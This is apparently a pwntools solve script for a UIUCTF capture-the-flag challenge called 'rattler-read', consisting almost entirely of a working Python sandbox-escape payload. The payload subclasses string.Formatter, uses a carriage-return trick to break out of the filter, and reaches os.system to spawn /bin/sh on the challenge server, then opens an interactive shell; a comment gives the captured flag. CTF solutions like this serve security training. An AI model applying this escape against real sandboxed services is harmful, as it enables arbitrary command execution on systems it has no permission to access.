

from pwn import *

if args['REMOTE']:
    io = remote('rattler-read.chal.uiuc.tf', 1337)
else:
    io = process(['python', 'main.py'])

payload = '''class MyFormatter(string.Formatter): pass; get_field = lambda me, field_name, args, kwargs: (string.Formatter.get_field(me, field_name, args, kwargs)[0]('/bin/sh'), ''); \x0dprint(MyFormatter().format("foo {0.__init__.__globals__[_os].system}", random.Random))'''.encode('utf8')
io.sendline(payload)
io.interactive()
# uiuctf{damn_1_8te_my_ta1l_ag41n}
